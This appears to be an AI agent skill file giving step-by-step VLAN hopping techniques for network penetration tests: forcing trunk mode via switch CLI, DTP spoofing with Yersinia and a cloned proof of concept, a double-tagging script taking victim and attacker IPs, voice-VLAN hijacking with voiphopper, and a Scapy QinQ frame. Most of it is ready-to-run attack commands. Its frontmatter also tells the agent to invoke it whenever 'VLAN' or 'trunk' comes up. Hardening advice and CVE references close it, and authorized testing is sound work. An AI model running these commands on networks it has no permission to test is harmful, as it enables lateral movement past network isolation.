---
name: vlan-segmentation-bypass
description: Bypass VLAN segmentation during network pentesting engagements. Use this skill whenever you need to pivot laterally across VLAN boundaries, test VLAN isolation, or assess Layer-2 network security. Trigger this skill for any task involving VLAN hopping, trunk configuration, DTP exploitation, double-tagging attacks, voice-VLAN hijacking, or when analyzing VLAN-related CVEs. Don't forget to use this skill even if the user just mentions "VLAN," "trunk," "802.1Q," or "network segmentation" in a security testing context.
---

# VLAN Segmentation Bypass

A skill for bypassing VLAN segmentation during authorized network penetration testing engagements.

## When to Use This Skill

Use this skill when:
- You have authenticated access to a switch and need to pivot across VLANs
- You're testing VLAN isolation on a network segment
- You need to assess DTP, double-tagging, or voice-VLAN vulnerabilities
- You're analyzing VLAN-related CVEs or misconfigurations
- The user mentions VLAN hopping, trunk mode, 802.1Q, or network segmentation in a pentesting context

## Prerequisites

- **Authorization**: Only use on networks where you have explicit written permission
- **Access Level**: Methods vary by access (switch CLI vs. regular access port)
- **Tools**: Yersinia, Scapy, VLANPWN, VoIP Hopper (Kali 2025.2+)

---

## Method 1: Trunk Mode Configuration (Switch CLI Access)

When you have console/Telnet/SSH access to the switch:

### Step 1: Identify Connected Port

```bash
# Via CDP messages
show cdp neighbors detail

# Or search by MAC address if CDP is disabled
show mac address-table | include <MAC_ADDRESS>
```

### Step 2: Enumerate Existing VLANs

```bash
show vlan brief
```

### Step 3: Configure Trunk Mode

```bash
configure terminal
interface <INTERFACE>
switchport trunk encapsulation dot1q
switchport mode trunk
exit
```

**Note**: This will temporarily disrupt connectivity.

### Step 4: Create VLAN Sub-Interfaces

Use the bundled script for automated setup:

```bash
./scripts/vlan-interface-setup.sh <INTERFACE> <VLAN_IDS>
```

Or manually:

```bash
# Modern method (preferred)
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link set eth0.10 up
sudo dhclient -v eth0.10

# Legacy method (deprecated but still works)
sudo vconfig add eth0 10
sudo ifconfig eth0.10 up
```

### Step 5: Test Connectivity

```bash
ping <GATEWAY_IP>
```

---

## Method 2: DTP Spoofing (No Switch CLI)

When connected to a regular access port with DTP enabled:

### Reconnaissance

```bash
./scripts/dtp-scan.sh <INTERFACE>
```

### Exploitation

```bash
# Using Yersinia (GUI)
sudo yersinia -G
# Navigate: Launch attack → DTP → Enable trunking

# Using Python PoC
git clone https://github.com/fleetcaptain/dtp-spoof.git
sudo python3 dtp-spoof/dtp-spoof.py -i <INTERFACE> --desirable
```

Once the port negotiates to trunk mode, proceed with Method 1 Step 4.

---

## Method 3: Double-Tagging (Native VLAN Abuse)

When on the native (untagged) VLAN:

```bash
./scripts/double-tagging.py \
    --interface <INTERFACE> \
    --nativevlan <NATIVE_VLAN> \
    --targetvlan <TARGET_VLAN> \
    --victim <VICTIM_IP> \
    --attacker <ATTACKER_IP>
```

This injects frames with two 802.1Q headers to hop to a second VLAN.

---

## Method 4: Voice-VLAN Hijacking

When targeting access ports with voice VLAN configuration:

```bash
# One-shot discovery and hop
sudo voiphopper -i <INTERFACE> -f cisco-7940

# Interactive assessment mode (passive sniff → auto-hop)
sudo voiphopper -i <INTERFACE> -z
```

This impersonates an IP phone to discover and hop into the VoIP VLAN via CDP/LLDP-MED.

---

## Method 5: QinQ (802.1ad) Stacking

For service-provider encapsulation scenarios:

```python
from scapy.all import *

outer = 100      # Service tag
inner = 30       # Target VLAN
payload = Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=inner)/IP(dst="10.10.30.1")/ICMP()
frame = Dot1Q(type=0x88a8, vlan=outer)/payload
sendp(frame, iface="<INTERFACE>")
```

---

## Defensive Recommendations

After testing, document these hardening recommendations:

1. **Disable DTP**: `switchport mode access` + `switchport nonegotiate`
2. **Change native VLAN**: Use unused VLAN + `vlan dot1q tag native`
3. **Prune VLANs**: `switchport trunk allowed vlan <LIST>`
4. **Enable security features**: Port security, DHCP snooping, DAI, 802.1X
5. **Lock voice policies**: Disable LLDP-MED auto voice or restrict to authenticated MAC OUIs
6. **Consider alternatives**: Private VLANs or L3 segmentation

---

## Known Vulnerabilities (2022-2024)

Check for these CVEs during assessments:

- **CVE-2022-20728**: Cisco Aironet/Catalyst APs - native VLAN injection
- **CVE-2024-20465**: Cisco IOS Industrial Ethernet - ACL bypass via REP

Always verify vendor advisories and patch levels.

---

## References

- [Cisco Nightmare Pentesting](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [VLANPWN Toolkit](https://github.com/casterbytethrowback/VLANPWN)
- [VoIP Hopper](https://github.com/hmgh0st/voiphopper)
- [Cisco Security Advisory](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apvlan-TDTtb4FY)
